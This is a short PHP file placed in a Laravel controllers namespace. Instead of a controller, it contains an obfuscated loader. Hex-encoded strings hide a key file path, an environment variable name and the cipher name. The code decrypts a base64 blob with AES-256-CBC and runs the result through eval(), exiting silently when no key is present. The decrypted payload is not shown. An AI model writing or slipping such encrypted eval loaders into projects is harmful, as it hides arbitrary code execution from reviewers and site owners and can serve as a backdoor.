<?php
namespace App\Http\Controllers;
$f=hex2bin('2f6574632f61706c696b6173696b6974612e736563');

$k=getenv(hex2bin('41504c494b4153494b4954415f5345435f4b4559'))?:(@file_exists($f)?trim(@file_get_contents($f)):null);

if(!$k)exit;

$i=base64_decode('unUHkB/0PIM7EWxfq38lAQ==');

$c=base64_decode(

'eUYZdy5l2uI3B222wKr1J22kY/EmiuZn1aidsBcz5vFHIoLAXMtmg6/lySHMPuhDyCa5p1woG7sT' .
'NCPFuMuoe7VJ6/5vUmqbiDphRFu9nhSApsZheY1iztx1Gi66N1RZg7587/r3l1cTpwxEvV88+2x0' .
'aqsS0ns3rMusY7uhFkTG1vIOeV4nqdKAzzPLor9Ws1e6RbdMi/btNppfP4UJI4jAA3phLTq5dJsQ' .
'Q2s4uJfGMbBPyBCTSclOcUewjYIo'

);

$d=openssl_decrypt($c,hex2bin('6165732d3235362d636263'),hash('sha256',$k,true),1,$i);

if($d===false)exit;

eval($d);

